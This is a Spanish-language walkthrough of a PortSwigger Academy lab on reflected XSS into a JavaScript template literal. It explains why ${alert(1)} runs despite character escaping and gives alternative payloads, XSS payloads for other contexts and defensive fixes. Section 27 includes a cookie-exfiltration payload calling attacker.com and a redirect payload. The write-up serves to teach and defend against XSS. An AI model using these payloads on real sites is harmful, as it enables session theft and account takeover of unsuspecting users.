# Lab 34 — Cross-site scripting: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

**URL del laboratorio:**  
`https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped`

**Nombre del laboratorio:**  
Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

**Objetivo:**  
Explotar un XSS reflejado dentro de un **template literal de JavaScript** para ejecutar la función `alert()`.

---

## 1. Capturas del laboratorio

### Imagen 1 — Página inicial del laboratorio

![Página inicial](images/imagen_1_pagina_inicial.png)

La aplicación es el blog típico de PortSwigger Academy. En este caso, la funcionalidad vulnerable vuelve a ser el buscador.

La parte importante no es visual. La vulnerabilidad no está en cómo se muestran los posts, ni en las imágenes, ni en ningún botón raro. La vulnerabilidad está en cómo el servidor toma el valor del parámetro de búsqueda y lo inserta dentro de un bloque JavaScript.

---

### Imagen 2 — Ejecución del `alert()`

![Alert ejecutado](images/imagen_2_alert_ejecutado.png)

Al introducir el payload correcto, el navegador ejecuta JavaScript y aparece el popup.

---

### Imagen 3 — Laboratorio resuelto

![Laboratorio resuelto](images/imagen_3_laboratorio_resuelto.png)

Cuando PortSwigger detecta que se ha ejecutado `alert()`, marca el laboratorio como resuelto.

---

# 2. Enunciado del laboratorio explicado

El laboratorio dice:

> La entrada del usuario se refleja dentro de una cadena tipo template literal, donde los signos `< >`, las comillas simples `'`, las comillas dobles `"`, la barra invertida `\` y los backticks `` ` `` están escapados como Unicode.

Esto significa varias cosas:

1. Hay una reflexión de input.
2. Esa reflexión ocurre dentro de JavaScript.
3. No ocurre dentro de una string clásica con comillas simples o dobles.
4. Ocurre dentro de un **template literal**, es decir, dentro de backticks.
5. El servidor intenta protegerse escapando caracteres típicamente peligrosos.
6. A pesar de eso, sigue siendo vulnerable porque permite usar `${...}`.

La frase clave del laboratorio es esta:

> reflected into a template literal

Eso cambia completamente el enfoque. Aquí no tenemos que romper una etiqueta HTML ni cerrar una string con `'`. Aquí aprovechamos una característica legítima de JavaScript: la interpolación de expresiones dentro de template literals.

---

# 3. Teoría necesaria antes de explotarlo

## 3.1 Qué es XSS reflejado

Un XSS reflejado ocurre cuando:

1. El usuario envía un valor controlado por él.
2. El servidor devuelve ese valor en la respuesta.
3. El navegador interpreta ese valor como código ejecutable.
4. El código se ejecuta en el contexto de la página vulnerable.

Ejemplo básico:

```html
<h1>Resultados para: INPUT</h1>
```

Si `INPUT` no se escapa correctamente, podríamos intentar:

```html
<script>alert(1)</script>
```

Pero en este laboratorio eso no es el camino correcto, porque el input no solo aparece como HTML visible. También aparece dentro de JavaScript.

---

## 3.2 Contexto: por qué el contexto lo es todo en XSS

En XSS no basta con decir “voy a meter `<script>alert(1)</script>`”.

Antes de elegir payload hay que responder:

**¿Dónde cae exactamente mi input?**

Puede caer en:

```html
<h1>INPUT</h1>
```

o en:

```html
<input value="INPUT">
```

o en:

```js
var x = 'INPUT';
```

o en:

```js
var x = `INPUT`;
```

Cada contexto requiere una técnica distinta.

En este laboratorio cae aquí:

```js
var message = `0 search results for 'INPUT'`;
```

Por tanto, el contexto real es:

```js
` ... INPUT ... `
```

Es decir:

**template literal de JavaScript**.

---

# 4. Qué es un template literal

Los template literals son una forma moderna de escribir cadenas en JavaScript usando backticks:

```js
const texto = `Hola mundo`;
```

A simple vista parece una string normal, pero tiene una característica especial: permite interpolar expresiones con `${...}`.

Ejemplo:

```js
const nombre = "Ana";
const saludo = `Hola ${nombre}`;
```

Resultado:

```txt
Hola Ana
```

Pero `${...}` no solo acepta variables. Acepta expresiones JavaScript completas.

Ejemplo:

```js
const resultado = `2 + 2 = ${2 + 2}`;
```

Resultado:

```txt
2 + 2 = 4
```

Y también acepta llamadas a funciones:

```js
const x = `Resultado: ${alert(1)}`;
```

Esto ejecuta:

```js
alert(1)
```

La interpolación no es texto decorativo. Es ejecución de código JavaScript.

---

# 5. Diferencia entre string normal y template literal

## 5.1 String normal

```js
var message = '0 search results for ${alert(1)}';
```

Aquí `${alert(1)}` es texto. No se ejecuta.

El navegador lo interpreta como una cadena literal.

---

## 5.2 Template literal

```js
var message = `0 search results for ${alert(1)}`;
```

Aquí `${alert(1)}` sí se evalúa.

El navegador lo interpreta como:

```js
"0 search results for " + alert(1)
```

Por eso se ejecuta el `alert()`.

---

# 6. Por qué este lab no se explota como los anteriores

En laboratorios anteriores había que romper el contexto.

Por ejemplo:

## Contexto HTML

```html
<h1>INPUT</h1>
```

Payload típico:

```html
<script>alert(1)</script>
```

## Contexto atributo HTML

```html
<input value="INPUT">
```

Payload típico:

```html
" autofocus onfocus=alert(1) x="
```

## Contexto string JavaScript clásica

```js
var searchTerms = 'INPUT';
```

Payload típico:

```js
'-alert(1)-'
```

o, si había escapes deficientes:

```js
\'-alert(1)//
```

## Contexto template literal

```js
var message = `INPUT`;
```

Payload correcto:

```js
${alert(1)}
```

Aquí no cerramos nada. No necesitamos salir de la string. No necesitamos `<script>`. No necesitamos comillas. No necesitamos backticks.

Ya estamos en un contexto que permite ejecución.

---

# 7. Qué filtra el servidor y por qué parece seguro

El enunciado dice que estos caracteres están escapados o codificados:

- `<`
- `>`
- `'`
- `"`
- `\`
- `` ` ``

Eso impide muchas técnicas clásicas.

## 7.1 Si intentas HTML

Payload:

```html
<script>alert(1)</script>
```

El servidor convierte los caracteres peligrosos en algo no ejecutable o los escapa.

Resultado: no puedes crear una etiqueta `<script>`.

---

## 7.2 Si intentas romper la string con comillas

Payload:

```js
'-alert(1)-'
```

El servidor escapa las comillas, por lo que no sales del contexto.

---

## 7.3 Si intentas cerrar el template literal con backtick

Payload:

```js
`;alert(1);//
```

El backtick se escapa como Unicode, por lo que no puedes cerrar el template literal.

---

## 7.4 Entonces, ¿por qué sigue siendo vulnerable?

Porque no necesitas usar ninguno de esos caracteres.

El payload:

```js
${alert(1)}
```

usa:

- `$`
- `{`
- `}`
- letras
- paréntesis

Y esos caracteres no están bloqueados.

El filtro está pensado para impedir “salidas” del contexto, pero el problema es que **no hace falta salir del contexto**.

---

# 8. Punto clave: no rompemos el template literal

En muchos XSS, el objetivo es escapar:

```js
var x = 'INPUT';
```

Queremos convertirlo en:

```js
var x = ''; alert(1); //
```

Pero aquí no.

Aquí el código vulnerable es:

```js
var message = `0 search results for 'INPUT'`;
```

Si introducimos:

```js
${alert(1)}
```

queda:

```js
var message = `0 search results for '${alert(1)}'`;
```

Esto sigue siendo sintácticamente válido.

No hay que romper nada.

El template literal sigue abierto y cerrado correctamente.

El navegador evalúa la expresión dentro de `${...}` y ejecuta `alert(1)`.

---

# 9. Análisis del código vulnerable real

Al introducir una cadena normal como:

```txt
pepe1
```

e inspeccionar el DOM, aparece algo como:

```html
<script>
    var message = `0 search results for 'pepe1'`;
    document.getElementById('searchMessage').innerText = message;
</script>
```

Esto nos confirma tres cosas:

1. El input `pepe1` se refleja.
2. Se refleja dentro de un bloque `<script>`.
3. Se refleja dentro de un template literal delimitado por backticks.

El valor no está en:

```html
<h1>pepe1</h1>
```

como única reflexión. La parte crítica es:

```js
var message = `0 search results for 'pepe1'`;
```

---

# 10. Qué cree el desarrollador que está haciendo

El desarrollador probablemente piensa:

```js
var message = `0 search results for 'pepe1'`;
document.getElementById('searchMessage').innerText = message;
```

Y razona:

“Uso `innerText`, no `innerHTML`, por tanto no se ejecuta HTML”.

Y eso es verdad, pero solo parcialmente.

`innerText` evita que el contenido final se interprete como HTML.

Por ejemplo, si `message` fuese:

```html
<script>alert(1)</script>
```

al hacer:

```js
element.innerText = message;
```

se mostraría como texto, no se ejecutaría.

Pero el problema ocurre antes:

```js
var message = `0 search results for '${alert(1)}'`;
```

El `alert()` se ejecuta durante la evaluación del template literal, antes de llegar a `innerText`.

Por eso `innerText` no salva esta vulnerabilidad.

---

# 11. Payload final

Payload:

```js
${alert(1)}
```

Se introduce directamente en el buscador.

---

# 12. Resultado en el DOM

Después de introducir el payload, el DOM queda así:

```html
<script>
    var message = `0 search results for '${alert(1)}'`;
    document.getElementById('searchMessage').innerText = message;
</script>
```

JavaScript evalúa:

```js
alert(1)
```

y el laboratorio se resuelve.

---

# 13. Flujo de ejecución exacto

1. El usuario introduce:

```js
${alert(1)}
```

2. El navegador envía la búsqueda al servidor.

3. El servidor genera una respuesta HTML con un bloque JavaScript.

4. El input se inserta dentro de un template literal:

```js
var message = `0 search results for '${alert(1)}'`;
```

5. El navegador parsea el HTML.

6. Al llegar al bloque `<script>`, el motor JavaScript empieza a ejecutar.

7. JavaScript evalúa el template literal.

8. Dentro del template literal encuentra:

```js
${alert(1)}
```

9. Ejecuta la expresión `alert(1)`.

10. Aparece el popup.

11. PortSwigger detecta la ejecución y marca el lab como resuelto.

---

# 14. Por qué el resultado visible muestra `undefined`

En la captura final puede aparecer algo como:

```txt
0 search results for 'undefined'
```

Esto pasa porque `alert()` devuelve `undefined`.

Ejemplo:

```js
const x = `${alert(1)}`;
```

Primero se ejecuta `alert(1)`, y luego su valor de retorno se inserta en la string.

Como `alert()` no devuelve un valor útil, el resultado es:

```txt
undefined
```

Por eso la página puede acabar mostrando:

```txt
0 search results for 'undefined'
```

Eso no es un fallo. Es una prueba indirecta de que la función se ejecutó.

---

# 15. Diferencia entre evaluación y renderizado

Es importante separar dos momentos:

## 15.1 Evaluación JavaScript

Aquí ocurre el XSS:

```js
var message = `0 search results for '${alert(1)}'`;
```

La ejecución ocurre durante la construcción de `message`.

## 15.2 Renderizado en el DOM

Después se ejecuta:

```js
document.getElementById('searchMessage').innerText = message;
```

Esto solo pinta texto en pantalla.

El daño ya ocurrió antes.

---

# 16. Por qué `${alert(1)}` no necesita comillas

Dentro de `${...}` puedes poner una expresión JavaScript.

Esto es válido:

```js
${alert(1)}
```

Esto también:

```js
${confirm(1)}
```

Esto también:

```js
${prompt(1)}
```

Esto también:

```js
${console.log(1)}
```

No necesitas comillas porque `alert` es una función y `1` es un número.

Si quisieras pasar texto, entonces sí:

```js
${alert("XSS")}
```

Pero en este laboratorio las comillas dobles están codificadas, así que usamos `alert(1)`.

---

# 17. Payloads alternativos

El payload mínimo es:

```js
${alert(1)}
```

Pero hay variantes:

```js
${alert()}
```

```js
${confirm(1)}
```

```js
${prompt(1)}
```

```js
${window.alert(1)}
```

```js
${self.alert(1)}
```

```js
${top.alert(1)}
```

```js
${globalThis.alert(1)}
```

```js
${(()=>alert(1))()}
```

```js
${Function`alert(1)`()}
```

Ojo: algunas variantes usan backticks o caracteres que en este lab podrían estar escapados. La más limpia sigue siendo:

```js
${alert(1)}
```

---

# 18. Por qué no usamos `<script>`

No lo necesitamos.

Además, `<` y `>` están codificados.

Aunque intentásemos:

```html
<script>alert(1)</script>
```

el servidor impediría que el navegador lo interpretase como etiqueta.

Pero el payload `${alert(1)}` no depende de HTML.

Ataca directamente el contexto JavaScript.

---

# 19. Por qué no usamos `</script>`

En otros labs, cuando estamos dentro de un bloque `<script>`, una técnica útil es:

```html
</script><script>alert(1)</script>
```

Pero aquí no es necesaria.

Además, el lab indica que `<` y `>` están codificados, así que esa técnica queda neutralizada.

La solución elegante es explotar el propio template literal.

---

# 20. Por qué no usamos comillas simples ni dobles

No necesitamos construir strings.

Payload:

```js
${alert(1)}
```

No contiene:

- `'`
- `"`
- `` ` ``

Eso lo hace muy robusto frente a los filtros del lab.

---

# 21. Qué significa “Unicode-escaped”

Cuando el enunciado dice que ciertos caracteres están escapados como Unicode, significa que el servidor transforma caracteres peligrosos en secuencias tipo:

```js
\u003c
```

por `<`, o:

```js
\u0060
```

por backtick.

Esto evita que esos caracteres actúen como delimitadores reales en el código.

Pero no evita que `${...}` sea interpretado como interpolación si `$`, `{` y `}` siguen llegando intactos.

---

# 22. Error conceptual del filtro

El filtro protege caracteres, no protege el contexto.

Ese es el fallo.

En seguridad web, escapar caracteres sueltos no basta. Hay que entender dónde se inserta el input.

Aquí el input se inserta en un template literal. Por tanto, hay que neutralizar la interpolación `${...}`.

Si no se neutraliza, cualquier expresión dentro de `${}` puede ejecutarse.

---

# 23. Comparación con el lab anterior de backslash

En el lab anterior, el problema era que:

- `'` se escapaba
- `\` no se escapaba
- se podía usar `\\'` para romper la string

Payload típico:

```js
\'-alert(1)//
```

Aquí no.

En este lab:

- la barra invertida también está escapada
- las comillas están escapadas o codificadas
- los backticks están escapados
- no puedes romper la estructura fácilmente

Pero no necesitas romperla.

La vulnerabilidad está en que el template literal ejecuta `${...}`.

---

# 24. Diferencia entre “salir del contexto” y “usar el contexto”

## Salir del contexto

Ejemplo:

```js
var x = 'INPUT';
```

Payload:

```js
'; alert(1); //
```

Objetivo: cerrar la string y meter código fuera.

## Usar el contexto

Ejemplo:

```js
var x = `INPUT`;
```

Payload:

```js
${alert(1)}
```

Objetivo: usar una característica legítima del contexto.

Este lab es del segundo tipo.

---

# 25. Explicación paso a paso de la explotación práctica

## Paso 1 — Abrir el laboratorio

URL de ejemplo usada:

```txt
https://0a1e00cf045ea237800503fa008f00b6.web-security-academy.net/
```

La página inicial corresponde a la imagen 1.

---

## Paso 2 — Localizar la funcionalidad vulnerable

El laboratorio tiene un buscador.

Como en otros labs de XSS de PortSwigger, la búsqueda suele reflejar el término introducido.

Probamos con:

```txt
pepe1
```

---

## Paso 3 — Inspeccionar el DOM

Buscamos dónde aparece `pepe1`.

Encontramos:

```html
<script>
    var message = `0 search results for 'pepe1'`;
    document.getElementById('searchMessage').innerText = message;
</script>
```

Esto confirma que el input está en template literal.

---

## Paso 4 — Elegir payload

Como estamos dentro de:

```js
` ... `
```

usamos:

```js
${alert(1)}
```

---

## Paso 5 — Ejecutar payload

Introducimos en el buscador:

```js
${alert(1)}
```

---

## Paso 6 — Confirmar ejecución

Aparece el popup de la imagen 2.

---

## Paso 7 — Confirmar laboratorio resuelto

El laboratorio aparece como resuelto, como en la imagen 3.

---

# 26. Qué ocurre si el payload se ve como texto en la página

Puede ocurrir que después de ejecutar el alert se muestre:

```txt
0 search results for 'undefined'
```

Esto no invalida el ataque.

`alert()` se ejecuta y devuelve `undefined`.

Ese `undefined` se inserta dentro del mensaje final.

---

# 27. Por qué este lab es peligroso en entornos reales

En una aplicación real, en vez de:

```js
${alert(1)}
```

podrías tener payloads como:

```js
${fetch('https://attacker.com/?c='+document.cookie)}
```

o:

```js
${location='https://attacker.com'}
```

Pero en este laboratorio solo se requiere `alert()`.

El impacto real depende de:

- si las cookies son accesibles por JavaScript
- si hay tokens en el DOM
- si hay datos sensibles en la página
- si el usuario está autenticado
- si se pueden hacer acciones como el usuario

---

# 28. Defensa correcta

## 28.1 No insertar input de usuario directamente en template literals

Esto es peligroso:

```js
var message = `0 search results for '${userInput}'`;
```

Aunque escapes comillas y HTML, sigue siendo peligroso si no neutralizas `${`.

---

## 28.2 Usar serialización segura

Mejor:

```js
var message = "0 search results for " + JSON.stringify(userInput);
```

O generar el dato como JSON real:

```js
const userInput = "valor serializado de forma segura";
```

---

## 28.3 Escapar específicamente para template literals

Si por algún motivo tienes que insertar input dentro de backticks, debes neutralizar:

- `\`
- `` ` ``
- `${`

Una función defensiva mínima sería:

```js
function escapeForTemplateLiteral(input) {
  return input
    .replace(/\\/g, '\\\\')
    .replace(/`/g, '\\`')
    .replace(/\$\{/g, '\\${');
}
```

El punto clave es escapar `${`, no solo `$`.

---

## 28.4 Usar `textContent` / `innerText` correctamente

Para mostrar mensajes en pantalla, lo ideal es no generar JavaScript dinámico con input.

Ejemplo seguro:

```html
<div id="searchMessage"></div>
<script>
  const message = document.createTextNode(userControlledValue);
  document.getElementById('searchMessage').appendChild(message);
</script>
```

O más simple:

```js
document.getElementById('searchMessage').textContent = userControlledValue;
```

Pero el valor debe llegar como dato seguro, no insertado dentro de código JavaScript ejecutable.

---

## 28.5 CSP como defensa adicional

Una Content Security Policy estricta puede reducir el impacto:

```http
Content-Security-Policy: script-src 'self'
```

Pero CSP no arregla la causa raíz.

La causa raíz es insertar input dentro de un contexto JavaScript ejecutable.

---

# 29. Regla final de seguridad

No pienses solo en caracteres peligrosos.

Piensa en el contexto.

En este lab, el contexto es:

```js
` ... `
```

Y dentro de ese contexto, lo peligroso es:

```js
${...}
```

Por tanto, si no neutralizas `${`, sigues siendo vulnerable.

---

# 30. Resumen ejecutivo

Payload usado:

```js
${alert(1)}
```

Código vulnerable resultante:

```js
var message = `0 search results for '${alert(1)}'`;
```

Motivo por el que funciona:

- el input cae dentro de un template literal
- `${...}` evalúa expresiones JavaScript
- `alert(1)` se ejecuta durante la evaluación
- no hace falta usar `<script>`
- no hace falta romper comillas
- no hace falta cerrar backticks

---

# 31. Frase clave

> En un template literal, `${...}` no es texto: es ejecución.

---

# 32. Conclusión final

Este laboratorio es especialmente importante porque enseña que un filtro puede parecer muy fuerte y aun así fallar por no entender el contexto.

El servidor escapa caracteres típicos:

- `<`
- `>`
- `'`
- `"`
- `\`
- `` ` ``

Pero deja intacto:

```js
${...}
```

Y eso es suficiente para ejecutar código.

La explotación no consiste en escapar del template literal. Consiste en aprovecharlo.

